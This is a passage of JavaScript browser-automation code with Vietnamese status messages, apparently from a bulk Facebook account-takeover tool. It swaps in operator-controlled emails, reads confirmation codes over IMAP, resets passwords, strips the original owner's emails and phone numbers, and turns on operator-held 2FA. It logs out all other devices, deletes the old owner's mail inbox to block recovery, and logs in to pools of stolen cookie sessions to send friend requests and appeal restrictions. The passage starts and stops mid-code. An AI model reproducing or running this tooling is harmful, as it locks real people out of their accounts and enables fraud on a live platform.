                                                send('message', {id: item.id, message: 'Không tìm thấy VIA'})

                                            }

                                            await page.waitForTimeout(3000)
                                            
                                        }

                                        send('message', {id: item.id, message: 'Share thành công '+shareSuccessCount+'/'+accPage.length+' page'})

                                        lastMsg = 'Share thành công '+shareSuccessCount+'/'+accPage.length+' page'

                                    } catch {

                                        send('message', {id: item.id, message: 'Không thể lấy thông tin page'})

                                    }

                                }

                                if (setting.khangPage.value) {

                                    try {

                                        send('message', {id: item.id, message: 'Đang lấy thông tin page'})

                                        const fbPage = new Page(page, item, data.fb_dtsg, data.accessToken, data.lsd)

                                        let pageData = await fbPage.checkPage()

                                        if (setting.khangPageMode.value === 'id') {

                                            let pageIds = []

                                            if (setting.khangPageId.value.includes(',')) {
                                                pageIds = setting.khangPageId.value.split(',').map(item => item.trim()).filter(item => item)
                                            } else {
                                                pageIds = setting.khangPageId.value.split(/\r?\n|\r|\n/g).map(item => item.trim()).filter(item => item)
                                            }

                                            if (pageIds) {

                                                pageData = pageData.filter(item => pageIds.includes(item.id))

                                            }

                                        }

                                        const pageDie = pageData.filter(item => {

                                            return item.status === 'Cần kháng'

                                        })


                                        let khangSuccess = 0

                                        for (let index = 0; index < pageDie.length; index++) {

                                            try { process.kill(browser.process().pid, 0)} catch { break }

                                            const pageId = pageDie[index].id

                                            try {

                                                send('message', {id: item.id, message: 'Đang kháng page '+pageId})

                                                await fbPage.khangPage(pageId, setting.chooseLine.value, setting.noiDungKhang.value)

                                                send('message', {id: item.id, message: 'Kháng page '+pageId+' thành công'})

                                                khangSuccess++

                                            } catch {
                                                send('message', {id: item.id, message: 'Kháng page '+pageId+' thất bại'})
                                            }

                                            await page.waitForTimeout(2000)

                                        }

                                        send('message', {id: item.id, message: 'Kháng thành công '+khangSuccess+'/'+pageDie.length+' page'})

                                        lastMsg = 'Kháng thành công '+khangSuccess+'/'+pageDie.length+' page'

                                    } catch (err) {

                                        send('message', {id: item.id, message: 'Không thể lấy thông tin page'})

                                        lastMsg = 'Không thể lấy thông tin page'

                                    }

                                }

                            }

                            if (mode === 'normal' && tool === 'change' && !error) {

                                // Refresh Data

                                if (setting.changeCookie.value || setting.changePassword.value || setting.changeHacked.value || setting.forgotPassword.value) {
                                    data = await getAccessToken(page)
                                }

                                let change = new Change(page, item.uid, item.password, item.email, data.fb_dtsg, data.lsd)

                                // Change Cookie 

                                if (setting.changeCookie.value) {

                                    try {

                                        const newEmailData = item.newEmail.split('|')
                                        newEmail = newEmailData[0].trim()
                                        const newEmailPassword = newEmailData[1].trim()

                                        const result = await checkImap(newEmail, newEmailPassword)
                                    
                                        if (result) {

                                            send('message', {id: item.id, message: 'Đang thêm email '+newEmail})

                                            // Add mail

                                            const newEmailData = item.newEmail.split('|')
                                            newEmail = newEmailData[0].trim()
                                            const newEmailPassword = newEmailData[1].trim()

                                            send('message', {id: item.id, message: 'Đang thêm email '+newEmail})

                                            let addMailSuccess = false

                                            if (setting.addEmailMode.value.length > 0) {

                                                for (let index = 0; index < setting.addEmailMode.value.length; index++) {

                                                    try { process.kill(browser.process().pid, 0)} catch { break }

                                                    if (index > 0) {
                                                        send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                    }

                                                    const chedo = setting.addEmailMode.value[index]

                                                    try {

                                                        if (chedo === 'api') {
                                                            await change.addMail(newEmail, () => {
                                                                send('removeEmail', {id: item.id, newEmail})
                                                            })
                                                        }

                                                        if (chedo === 'api2') {
                                                            await change.addMailApi(newEmail, () => {
                                                                send('removeEmail', {id: item.id, newEmail})
                                                            })
                                                        }

                                                        if (chedo === 'api_mbasic') {
                                                            await change.addMailMBasicApi(newEmail, () => {
                                                                send('removeEmail', {id: item.id, newEmail})
                                                            })

                                                        }
                                                        
                                                        if (chedo === 'mbasic') {
                                                            await change.addMailMBasic(newEmail, () => {
                                                                send('removeEmail', {id: item.id, newEmail})
                                                            })

                                                        }

                                                        addMailSuccess = true

                                                        break

                                                    } catch {
                                                        // send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                    }
                                                    
                                                }

                                                if (addMailSuccess) {
                                                    send('message', {id: item.id, message: 'Thêm email thành công'})
                                                } else {
                                                    error = true
                                                    send('message', {id: item.id, message: 'Thêm email thất bại'})
                                                }

                                            } else {
                                                error = true
                                                send('message', {id: item.id, message: 'Chưa chọn chế độ thêm email'})

                                            }

                                            if (addMailSuccess) {

                                                send('message', {id: item.id, message: 'Đang xác nhận email'})

                                                await page.waitForTimeout(10000)

                                                try {

                                                    const code = await getMailCode(newEmail, newEmailPassword)

                                                    if (setting.confirmMailMode.value === 'api_mbasic') {
                                                        await change.confirmMailMbasicApi(newEmail, code.code)
                                                    }
        
                                                    if (setting.confirmMailMode.value === 'mbasic') {
                                                        await change.confirmMailMbasic(newEmail, code.code)
                                                    }
        
                                                    if (setting.confirmMailMode.value === 'link') {
                                                        await page.goto(code.link)
                                                    }

                                                    send('message', {id: item.id, message: 'Xác nhận email thành công'})

                                                    send('updateEmail', {
                                                        id: item.id,
                                                        newEmail,
                                                        newEmailPassword
                                                    })

                                                } catch {

                                                    error = true

                                                    send('message', {id: item.id, message: 'Xác nhận email thất bại'})
                                                }

                                            }

                                            if (!error) {

                                                try {

                                                    const forgot = new Forgot(page, false, setting, newEmail, newEmailPassword)

                                                    send('message', {id: item.id, message: 'Đang tiến hành reset mật khẩu'})

                                                    newPassword = await forgot.forgotPasswordApi(true, (message) => {
                                                        send('message', {id: item.id, message})
                                                    })

                                                    if (newPassword) {

                                                        send('updatePassword', {
                                                            id: item.id,
                                                            new: newPassword
                                                        })

                                                        item.password = newPassword

                                                        send('message', {id: item.id, message: 'Reset mật khẩu thành công'})

                                                    } else {
                                                        error = true
                                                        send('message', {id: item.id, message: 'Reset mật khẩu thất bại'})
                                                    }

                                                } catch (err) {
                                                    error = true
                                                    send('message', {id: item.id, message: 'Reset mật khẩu thất bại'})
                                                }

                                            }

                                            if (setting.changeMailbat2FaMode.value === 'after' && newPassword && !error) {

                                                skip2Fa = true

                                                if (setting.bat2FaMode.value.length > 0) {

                                                    let bat2FaSuccess = false
                    
                                                    send('message', {id: item.id, message: 'Đang bật 2FA'})
                
                                                    let twofa = false
                                                    const fbData = await getAccessToken(page)
                    
                                                    for (let index = 0; index < setting.bat2FaMode.value.length; index++) {

                                                        try { process.kill(browser.process().pid, 0)} catch { break }
                
                                                        if (index > 0) {
                                                            send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                        }
                
                                                        const chedo = setting.bat2FaMode.value[index]
                    
                                                        try {
                    
                                                            if (chedo === 'api_mbasic') {
                                                                twofa = await change.bat2FaMBasic(newPassword, fbData.fb_dtsg)
                                                            }
                        
                                                            if (chedo === 'api_www') {
                                                                twofa = await change.bat2Fa(newPassword, fbData.fb_dtsg)
                                                            }
                        
                                                            if (chedo === 'api_m') {
                                                                twofa = await change.bat2FaM(newPassword, fbData.fb_dtsg)
                                                            }
                        
                                                            bat2FaSuccess = true
                    
                                                            break
                    
                                                        } catch (err) {
                                                            send('message', {id: item.id, message: err})
                                                        }
                                                        
                                                    }
                    
                                                    if (bat2FaSuccess && twofa) {
                
                                                        send('update2Fa', {
                                                            id: item.id,
                                                            twofa
                                                        })
                
                                                        send('message', {id: item.id, message: 'Bật 2FA thành công'})
                                                    } else {
                                                        error = true
                                                    }
                    
                                                } else {
                                                    error = true
                                                    send('message', {id: item.id, message: 'Chưa chọn chế độ bật 2FA'})
                                                }

                                            }

                                        } else {
                                            error = true
                                            send('message', {id: item.id, message: 'Change cookie thất bại: Email khóa'})
                                        }

                                    } catch (err) {
                                        error = true
                                        send('message', {id: item.id, message: 'Change cookie thất bại'})
                                    }

                                }

                                // Đổi thông tin tài khoản

                                if (setting.changeHacked.value && !setting.changeCookie.value && !error) {

                                    let newPwd = ''

                                    if (setting.randomPassword.value) {
                                        newPwd = 'A@!'+generator.generate({
                                            length: 12,
                                            numbers: true
                                        })
                                    } else {
                                        newPwd = setting.newPassword.value
                                    }

                                    const newEmailData = item.newEmail.split('|')
                                    newEmail = newEmailData[0].trim()
                                    const newEmailPassword = newEmailData[1].trim()
                                    
                                    try {

                                        send('message', {id: item.id, message: 'Đang đổi thông tin qua link hacked'})

                                        try {
                                            
                                            
                                            const fakeEmail = generateUsername('')+randomNumber(111111, 999999)+'@hotmail.com'

                                            const z = new zFetch(page)

                                            await z.post("https://www.facebook.com/add_contactpoint/dialog/submit/", {
                                                "headers": {
                                                    "content-type": "application/x-www-form-urlencoded",
                                                },
                                                "body": "jazoest=22134&fb_dtsg="+data.fb_dtsg+"&next=&contactpoint="+fakeEmail+"&__user="+item.uid+"&__a=1&__dyn=&__req=1&__be=1&__pc=PHASED%3ADEFAULT&dpr=1&__rev=&__s=&__hsi=7294542474242900342&__spin_r=1009523889&__spin_b=trunk&__spin_t=1698393019",
                                            })

                                        } catch {}

                                        await change.changeHackedApi(setting.forgotPassword.value, newPwd, newEmail, newEmailPassword, msg => {
                                            send('message', {id: item.id, message: msg})
                                        }, () => {

                                            send('updatePassword', {
                                                id: item.id,
                                                new: newPwd
                                            })

                                            item.password = newPwd

                                        }, () => {
                                            send('updateEmail', {
                                                id: item.id,
                                                newEmail,
                                                newEmailPassword
                                            })
                                        }, () => {
                                            send('removeEmail', {
                                                id: item.id,
                                                newEmail
                                            })
                                        })

                                        send('message', {id: item.id, message: 'Đổi thông tin thành công'})


                                    } catch (err) {

                                        log(err)
                                        
                                        error = true
                                        send('message', {id: item.id, message: 'Đổi thông tin thất bại'})
                                    }

                                } else {

                                    // Refresh Data

                                    if (setting.changeCookie.value || setting.changePassword.value || setting.changeHacked.value || setting.forgotPassword.value) {
                                        data = await getAccessToken(page)
                                    }
            
                                    change = new Change(page, item.uid, item.password, item.email, data.fb_dtsg, data.lsd)

                                    // Đổi mật khẩu

                                    if (setting.changePassword.value && !setting.changeCookie.value && !error) {

                                        await page.waitForTimeout(5000)

                                        send('message', {id: item.id, message: 'Đang đổi mật khẩu'})

                                        let newPwd = ''

                                        if (setting.randomPassword.value) {
                                            newPwd = 'A@!'+generator.generate({
                                                length: 10,
                                                numbers: true
                                            })
                                        } else {
                                            newPwd = setting.newPassword.value
                                        }

                                        if (setting.changePasswordMode.value.length > 0) {

                                            let changePasswordSuccess = false

                                            for (let index = 0; index < setting.changePasswordMode.value.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                if (index > 0) {
                                                    send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                }

                                                const chedo = setting.changePasswordMode.value[index]

                                                try {

                                                    if (chedo === 'api') {
                                                        await change.changePassword(newPwd)
                                                    }

                                                    if (chedo === 'api_mbasic') {
                                                        await change.changePasswordApiMBasic(newPwd)
                                                    }

                                                    if (chedo === 'mbasic') {
                                                        await change.changePasswordMBasic(newPwd)
                                                    }

                                                    changePasswordSuccess = true

                                                    break

                                                } catch (err) {

                                                    // send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                }
                                                
                                            }

                                            if (changePasswordSuccess) {

                                                send('updatePassword', {
                                                    id: item.id,
                                                    new: newPwd
                                                })

                                                item.password = newPwd

                                                send('message', {id: item.id, message: 'Đổi mật khẩu thành công!'})
                                            } else {
                                                error = true
                                                send('message', {id: item.id, message: 'Đổi mật khẩu thất bại'})
                                            }

                                        } else {
                                            error = true
                                            send('message', {id: item.id, message: 'Chưa chọn chế độ đổi mật khẩu'})
                                        }

                                    }

                                    // Refresh Data

                                    if (setting.changeCookie.value || setting.changePassword.value || setting.changeHacked.value || setting.forgotPassword.value) {
                                        data = await getAccessToken(page)
                                    }

                                    change = new Change(page, item.uid, item.password, item.email, data.fb_dtsg, data.lsd)

                                    // Thêm Email

                                    if (setting.addEmail.value && !setting.changeCookie.value && !error) {

                                        await page.waitForTimeout(5000)

                                        const newEmailData = item.newEmail.split('|')
                                        newEmail = newEmailData[0].trim()
                                        const newEmailPassword = newEmailData[1].trim()

                                        send('message', {id: item.id, message: 'Đang thêm email '+newEmail})

                                        let addMailSuccess = false

                                        if (setting.addEmailMode.value.length > 0) {

                                            for (let index = 0; index < setting.addEmailMode.value.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                if (index > 0) {
                                                    send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                }

                                                const chedo = setting.addEmailMode.value[index]

                                                try {

                                                    if (chedo === 'api') {
                                                        await change.addMail(newEmail, () => {
                                                            send('removeEmail', {id: item.id, newEmail})
                                                        })
                                                    }

                                                    if (chedo === 'api2') {
                                                        await change.addMailApi(newEmail, () => {
                                                            send('removeEmail', {id: item.id, newEmail})
                                                        })
                                                    }

                                                    if (chedo === 'api_mbasic') {
                                                        await change.addMailMBasicApi(newEmail, () => {
                                                            send('removeEmail', {id: item.id, newEmail})
                                                        })
                                                    }
                                                    
                                                    if (chedo === 'mbasic') {
                                                        await change.addMailMBasic(newEmail, () => {
                                                            send('removeEmail', {id: item.id, newEmail})
                                                        })
                                                    }

                                                    addMailSuccess = true

                                                    break

                                                } catch {
                                                    // send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                }
                                                
                                            }

                                            if (addMailSuccess) {
                                                send('message', {id: item.id, message: 'Thêm email thành công'})
                                            } else {
                                                error = true
                                                send('message', {id: item.id, message: 'Thêm email thất bại'})
                                            }

                                        } else {
                                            error = true
                                            send('message', {id: item.id, message: 'Chưa chọn chế độ thêm email'})

                                        }

                                        if (addMailSuccess) {

                                            send('message', {id: item.id, message: 'Đang xác nhận email'})

                                            await page.waitForTimeout(10000)

                                            try {

                                                const code = await getMailCode(newEmail, newEmailPassword)

                                                if (setting.confirmMailMode.value === 'api_mbasic') {
                                                    await change.confirmMailMbasicApi(newEmail, code.code)
                                                }

                                                if (setting.confirmMailMode.value === 'mbasic') {
                                                    await change.confirmMailMbasic(newEmail, code.code)
                                                }

                                                if (setting.confirmMailMode.value === 'link') {
                                                    log(code)
                                                }

                                                send('message', {id: item.id, message: 'Xác nhận email thành công'})

                                                send('updateEmail', {
                                                    id: item.id,
                                                    newEmail,
                                                    newEmailPassword
                                                })

                                            } catch (err) {

                                                log(err)

                                                error = true

                                                send('message', {id: item.id, message: 'Xác nhận email thất bại'})
                                            }

                                        }

                                    }

                                }

                                // Refresh Data

                                if (setting.changeCookie.value || setting.changePassword.value || setting.changeHacked.value || setting.forgotPassword.value) {
                                    data = await getAccessToken(page)
                                }

                                change = new Change(page, item.uid, item.password, item.email, data.fb_dtsg, data.lsd)

                                // Xóa email phụ

                                if (setting.deleteAllEmail.value && !error) {

                                    await page.waitForTimeout(5000)

                                    if (!newEmail) {
                                        newEmail = item.email
                                    }

                                    const primaryEmail = await change.checkMailChinh()
                                    const emailPhu = (await change.getMailPhu('')).map(item => item.email)

                                    if (emailPhu.includes(newEmail)) {

                                        if (emailPhu.length > 1) { 

                                            let setEmailSuccess = false
                                            let deleteEmailSuccess = false

                                            send('message', {id: item.id, message: 'Đang đặt email chính'})

                                            if (setting.setPrimaryEmailMode.value.length > 0) {

                                                if (primaryEmail !== newEmail) {

                                                    for (let index = 0; index < setting.setPrimaryEmailMode.value.length; index++) {

                                                        try { process.kill(browser.process().pid, 0)} catch { break }

                                                        if (index > 0) {
                                                            send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                        }

                                                        const chedo = setting.setPrimaryEmailMode.value[index]

                                                        try {

                                                            if (chedo === 'mbasic') {
                                                                await change.setPrimaryEmailMbasic(newEmail)
                                                            } 

                                                            if (chedo === 'api_mbasic') {
                                                                await change.setPrimaryEmailApiMbasic(newEmail)
                                                            }
                                                            
                                                            if (chedo === 'm') {
                                                                await change.setPrimaryEmail(newEmail)
                                                            }

                                                            setEmailSuccess = true

                                                            break

                                                        } catch (err) {
                                                            send('message', {id: item.id, message: err})
                                                        }
                                                        
                                                    }

                                                    if (setEmailSuccess) {
                                                        send('message', {id: item.id, message: 'Đặt email chính thành công'})
                                                    }

                                                } else {
                                                    setEmailSuccess = true
                                                    send('message', {id: item.id, message: 'Đặt email chính thành công'})
                                                }

                                            } else {
                                                send('message', {id: item.id, message: 'Chưa chọn chế độ đặt email chính'})
                                            }

                                            setEmailSuccess = true

                                            if (setEmailSuccess) {

                                                send('message', {id: item.id, message: 'Đang xóa email phụ'})

                                                const emailPhu = (await change.getMailPhu(newEmail)).map(item => item.email)

                                                if (emailPhu.length > 0) {

                                                    if (setting.deleteEmailMode.value.length > 0 && emailPhu.length > 0) {

                                                        let message = 'Xóa email phụ thất bại'
                        
                                                        for (let index = 0; index < setting.deleteEmailMode.value.length; index++) {

                                                            try { process.kill(browser.process().pid, 0)} catch { break }

                                                            if (index > 0) {
                                                                send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                            }

                                                            const chedo = setting.deleteEmailMode.value[index]

                                                            try {

                                                                if (chedo === 'mbasic') {
                                                                    message = await change.deleteEmailMbasic(emailPhu)
                                                                } 

                                                                if (chedo === 'api_mbasic') {
                                                                    message = await change.deleteEmailMbasicApi(emailPhu)
                                                                }
                                                                
                                                                if (chedo === 'api') {
                                                                    message = await change.deleteEmailApi(emailPhu, item.email, item.passMail)
                                                                }

                                                                deleteEmailSuccess = true

                                                                break

                                                            } catch {}
                                                            
                                                        }

                                                        if (deleteEmailSuccess) {
                                                            send('message', {id: item.id, message})
                                                        } else {
                                                            error = true
                                                        }
                        
                                                    } else {
                                                        error = true
                                                        send('message', {id: item.id, message: 'Chưa chọn chế độ xóa email phụ'})
                                                    }

                                                } else {
                                                    send('message', {id: item.id, message: 'Không có email phụ'})
                                                }

                                            }

                                        } else {
                                            send('message', {id: item.id, message: 'Xóa email phụ thành công'})
                                        }

                                    } else {
                                        error = true
                                        send('message', {id: item.id, message: 'Không tìm thấy email để xóa'})
                                    }

                                }
                                

                                // Xóa số điện thoại

                                if (setting.deleteAllPhone.value && !error) {

                                    await page.waitForTimeout(5000)

                                    if (setting.deletePhoneMode.value.length > 0) {

                                        let deletePhoneSuccess = false

                                        if (!newPassword) {
                                            newPassword = item.password
                                        }

                                        send('message', {id: item.id, message: 'Đang xóa số điện thoại'})

                                        let message = ''

                                        for (let index = 0; index < setting.deletePhoneMode.value.length; index++) {

                                            try { process.kill(browser.process().pid, 0)} catch { break }

                                            if (index > 0) {
                                                send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                            }

                                            const chedo = setting.deletePhoneMode.value[index]

                                            try {

                                                if (chedo === 'api') {
                                                    message = await change.deletePhone(newPassword)
                                                }

                                                if (chedo === 'mbasic') {
                                                    message = await change.deletePhoneMbasic(newPassword)
                                                }

                                                if (chedo === 'api_mbasic') {
                                                    message = await change.deletePhoneMbasicApi(newPassword)
                                                }

                                                deletePhoneSuccess = true

                                                break

                                            } catch {
                                                // send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                            }
                                            
                                        }

                                        if (deletePhoneSuccess) {

                                            send('message', {id: item.id, message})

                                        } else {
                                            error = true
                                            send('message', {id: item.id, message: 'Xóa số điện thoại thất bại'})
                                        }

                                    } else {
                                        error = true
                                        send('message', {id: item.id, message: 'Chưa chọn chế độ xóa số điện thoại'})
                                    }

                                }

                                // Bật 2Fa 

                                if (setting.bat2Fa.value && !error) {

                                    if (!skip2Fa) {

                                        if (setting.bat2FaMode.value.length > 0) {

                                            let bat2FaSuccess = false
            
                                            send('message', {id: item.id, message: 'Đang bật 2FA'})

                                            let twofa = false


                                            if (!newPassword) {
                                                newPassword = item.password
                                            }
            
                                            for (let index = 0; index < setting.bat2FaMode.value.length; index++) {

                                                try { process.kill(browser.process().pid, 0)} catch { break }

                                                if (index > 0) {
                                                    send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                                }

                                                const chedo = setting.bat2FaMode.value[index]
            
                                                try {
            
                                                    if (chedo === 'api_mbasic') {
                                                        twofa = await change.bat2FaMBasic(newPassword)
                                                    }
                
                                                    if (chedo === 'api_www') {
                                                        twofa = await change.bat2Fa(newPassword)
                                                    }
                
                                                    if (chedo === 'api_m') {
                                                        twofa = await change.bat2FaM(newPassword)
                                                    }
                
                                                    bat2FaSuccess = true
            
                                                    break
            
                                                } catch (err) {
                                                    send('message', {id: item.id, message: err})
                                                }
                                                
                                            }
            
                                            if (bat2FaSuccess && twofa) {

                                                send('update2Fa', {
                                                    id: item.id,
                                                    twofa
                                                })

                                                send('message', {id: item.id, message: 'Bật 2FA thành công'})
                                            } else {
                                                error = true
                                            }
            
                                        } else {
                                            error = true
                                            send('message', {id: item.id, message: 'Chưa chọn chế độ bật 2FA'})
                                        }

                                    }
                                    
                                }

                                // Đăng xuất các thiết bị

                                if (setting.logoutAllDevice.value && !error) {

                                    await page.waitForTimeout(5000)

                                    if (setting.logoutAllDeviceMode.value.length > 0) {

                                        let logoutAllDeviceSuccess = false

                                        send('message', {id: item.id, message: 'Đang đăng xuất các thiết bị'})

                                        for (let index = 0; index < setting.logoutAllDeviceMode.value.length; index++) {

                                            try { process.kill(browser.process().pid, 0)} catch { break }

                                            if (index > 0) {
                                                send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                            }

                                            const chedo = setting.logoutAllDeviceMode.value[index]

                                            try {

                                                if (chedo === 'api') {
                                                    await change.logoutDevices()
                                                }

                                                if (chedo === 'api_mbasic') {
                                                    await change.logoutDevicesApiMbasic()
                                                }
                                                
                                                if (chedo === 'mbasic') {
                                                    await change.logoutDevicesMBasic()
                                                }

                                                logoutAllDeviceSuccess = true

                                                break

                                            } catch {
                                                // send('message', {id: item.id, message: 'Đang thử chế độ khác'})
                                            }
                                            
                                        }

                                        if (logoutAllDeviceSuccess) {

                                            send('message', {id: item.id, message: 'Đăng xuất các thiết bị thành công'})

                                        } else {
                                            error = true
                                            send('message', {id: item.id, message: 'Đăng xuất các thiết bị thất bại'})
                                        }

                                    } else {
                                        error = true
                                        send('message', {id: item.id, message: 'Chưa chọn chế độ đăng xuất thiết bị'})
                                    }

                                    if (setting.deleteOldCookie.value) {

                                        try {
                                            send('message', {id: item.id, message: 'Đang hủy cookie cũ'})

                                            await change.deleteOldCookie()

                                            send('message', {id: item.id, message: 'Hủy cookie cũ thành công'})
                                        } catch {
                                            send('message', {id: item.id, message: 'Hủy cookie cũ thất bại'})
                                        }

                                    }

                                    if (setting.deleteInbox.value) {

                                        try {

                                            const emailData = item.oldEmail.split('|')
                                            const email = emailData[0]
                                            const pass = emailData[1]

                                            send('message', {id: item.id, message: 'Đang chạy TUT chống back via'})

                                            await deleteInbox(email, pass)

                                        } catch {}
                                    }


                                }

                                // Khóa tài khoản 

                                if (setting.deactiveAccount.value && !error) {

                                    try {

                                        send('message', {id: item.id, message: 'Đang khóa tài khoản'})

                                        await change.deactiveAccount()

                                        send('message', {id: item.id, message: 'Khóa tài khoản thành công'})

                                    } catch (err) {
                                        error = true
                                        send('message', {id: item.id, message: 'Khóa tài khoản thất bại'})
                                    }

                                }

                            }

                            if (mode === 'normal' && tool === 'xmdt' && !error) {

                                try {

                                    if (setting.khangXmdt.value || setting.khang902.value) {

                                        const account = new Account(page, item.uid, item.twofa, data.fb_dtsg, data.accessToken, data.lsd)

                                        let quality = await account.getAccountQuality()

                                        const xmdt = new Xmdt(page, item, setting, ip, data.fb_dtsg, data.accessToken, data.lsd, quality.type)

                                        if (setting.khangXmdt.value) {

                                            if (setting.khangXmdtMode.value === 'khangBangPage') {

                                                try {

                                                    send('message', {id: item.id, message: 'Đang lấy thông tin page'})

                                                    const accessToken3 = await getAccessToken3(page, item.uid, data.fb_dtsg, item.twofa)

                                                    const fbPage = new Page(page, item, data.fb_dtsg, accessToken3, data.lsd)

                                                    const pageData = await fbPage.checkPage()

                                                    const pageDie = pageData.filter(item => {

                                                        return item.status === 'XMDT'

                                                    })

                                                    if (pageDie[0]) {

                                                        const pageId = pageDie[0].id 

                                                        send('message', {id: item.id, message: 'Đang kháng bằng page '+pageId})

                                                        await xmdt.khangXmdtApi((message) => {
                                                            send('message', {id: item.id, message})
                                                        }, false, false, pageId)

                                                        send('message', {id: item.id, message: 'Kháng bằng page thành công'})
                                                        lastMsg = 'Kháng bằng page thành công'

                                                        error = false


                                                    } else {

                                                        error = true

                                                        send('message', {id: item.id, message: 'Không có page để kháng'})
                                                        lastMsg = 'Không có page để kháng'
                                                        
                                                    }

                                                } catch (err) {

                                                    console.log(err)

                                                    error = true

                                                    send('message', {id: item.id, message: 'Kháng bằng page thất bại'})
                                                    lastMsg = 'Kháng bằng page thất bại'
                                                }

                                            } else if (setting.khangXmdtMode.value === 'khangBang273') {

                                                try {

                                                    let addFriendSuccess = false
                                                    let acceptFriendSuccess = false
                                                    let shareAccSuccess = false
                                                    let areFriend = false

                                                    const z = new zFetch(page)

                                                    const accounts = await account.getAdAccounts()

                                                    const existedIndex = accounts.findIndex(item => item.id.includes(setting.idTkqc.value))

                                                    if (existedIndex === -1) {

                                                        const via273 = new Db('via273')

                                                        let acc273 = ''

                                                        for (let index = 0; index < 99999; index++) {
                                                            
                                                            try { process.kill(browser.process().pid, 0)} catch { break }
                                                                                                                    
                                                            const randomItem = await via273.findRandom(item => item.process === 'UID Live')

                                                            if (randomItem) {

                                                                const res = await (await fetch('https://graph2.facebook.com/v3.3/'+randomItem.uid+'/picture?redirect=0')).json()
                        
                                                                if (res.data.width && res.data.height) {

                                                                    send('message', {id: randomItem.id, message: 'UID Live'})

                                                                    await via273.update(randomItem.id, {process: 'UID Live'})

                                                                    try {

                                                                        send('message', {id: item.id, message: 'Đang đăng nhập: '+randomItem.uid})

                                                                        randomItem.dtsg = await loginCookieApi(randomItem.cookies)

                                                                        send('message', {id: item.id, message: 'Đăng nhập thành công: '+randomItem.uid})

                                                                        acc273 = randomItem

                                                                        break

                                                                    } catch {

                                                                        send('message', {id: item.id, message: 'Đăng nhập thất bại: '+randomItem.uid})

                                                                        send('message', {id: randomItem.id, message: 'UID Die'})

                                                                        await via273.update(randomItem.id, {process: 'UID Die'})
                                                                        
                                                                    }
                                                                                                                                                                    
                                                                } else {
                                                                    send('message', {id: item.id, message: 'Tài khoản die: '+randomItem.uid})

                                                                    break
                                                                }
                                                                
                                                            }

                                                            await page.waitForTimeout(3000)
                                                            
                                                        }

                                                        if (acc273) {

                                                            let target = ''
                                                            let sender = ''
                                                            let using = ''

                                                            if (setting.addFriend273.value) {
                                                                target = item.uid 
                                                                sender = acc273.uid
                                                                using = 'cookie'
                                                            } else {
                                                                target = acc273.uid 
                                                                sender = item.uid
                                                            }

                                                            if (using === 'cookie') {

                                                                try {

                                                                    send('message', {id: item.id, message: 'Đang gửi lời mời kết bạn'})

                                                                    const res = await fetch("https://www.facebook.com/api/graphql/", {
                                                                        "headers": {
                                                                            "accept": "*/*",
                                                                            "accept-language": "en-US,en;q=0.9",
                                                                            "content-type": "application/x-www-form-urlencoded",
                                                                            "dpr": "0.9",
                                                                            "sec-ch-prefers-color-scheme": "light",
                                                                            "sec-fetch-dest": "empty",
                                                                            "sec-fetch-mode": "cors",
                                                                            "sec-fetch-site": "same-origin",
                                                                            "viewport-width": "1587",
                                                                            "x-asbd-id": "129477",
                                                                            "x-fb-friendly-name": "FriendingCometFriendRequestSendMutation",
                                                                            "x-fb-lsd": "9nxVYZ_mDpmjttd3C-ZURl",
                                                                            "cookie": acc273.cookies,
                                                                            "Referer": "https://www.facebook.com/profile.php?id="+target,
                                                                            "Referrer-Policy": "strict-origin-when-cross-origin"
                                                                        },
                                                                        "body": "av="+sender+"&__user="+sender+"&__a=1&__req=p&__hs=19665.HYP%3Acomet_pkg.2.1..2.1&dpr=1&__ccg=EXCELLENT&__rev=1009698433&__s=tdp65f%3Aoo2g20%3A14aaa3&__hsi=7297598015669684550&__dyn=7AzHK4HzE4e5Q1ryaxG4VuC2-m1xDwAxu13wFwhUKbgS3q5UObwNwnof8boG0x8bo6u3y4o2vyE3Qwb-q7oc81xoswIK1Rwwwqo465o-cwfG12wOx62G5Usw9m1YwBgK7o884y0Mo4G1hx-3m1mzXw8W58jwGzE8FU5e7oqBwJK2W5olwUwgojUlDw-wUwxwjFovUy2a0SEuBwFKq2-azqwqo4i223908O3216xi4UdUcojxK2B0oobo8oC1hxB0qo4e16wWwjE&__csr=g8Y8MTq9kLOkJR8x4AZbMTLRbkLRPGAuBEWlOcDtQipZlZvqqWhe_KjsHqgDCF4GECrKnSEV5BAyAaF4KW9Dpbg_CzbZoO2mmcXBGA8DLDUhLBoOE-4mipFeEa9Eb8Sim8xiqdG9CF1y68Gu68W4ElF0iE-Uyi58iy8fHwMwSUlwyzo8p84GegmCwlEWdwJwmE5a4EOfDwzU9EaUnxq15wn8swIwBxy3y6Eaodo3pwAyE5q2m3-18U2Jw2WA324U5u0gC0Mo1jj042Aw5Zw5Pwo8qzo06ly00KaE0Zx03Vo6-2mdw9m3-u0eUw4-w7owRDCw1dSJw2DU8GweF0no1-E7m03We2i058E09762C0UU0j8w2xo0gew&__comet_req=15&fb_dtsg="+acc273.dtsg+"&jazoest=25465&lsd=bDKLvgS6rXdNSQTYKST5kT&__aaid=0&__spin_r=1009698433&__spin_b=trunk&__spin_t=1699104443&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=FriendingCometFriendRequestSendMutation&variables=%7B%22input%22%3A%7B%22attribution_id_v2%22%3A%22ProfileCometTimelineListViewRoot.react%2Ccomet.profile.timeline.list%2Cvia_cold_start%2C1699104440833%2C56049%2C190055527696468%2C%22%2C%22friend_requestee_ids%22%3A%5B%22"+target+"%22%5D%2C%22refs%22%3A%5Bnull%5D%2C%22source%22%3A%22profile_button%22%2C%22warn_ack_for_ids%22%3A%5B%22"+target+"%22%5D%2C%22actor_id%22%3A%22"+sender+"%22%2C%22client_mutation_id%22%3A%222%22%7D%2C%22scale%22%3A1%7D&server_timestamps=true&doc_id=7033797416660129",
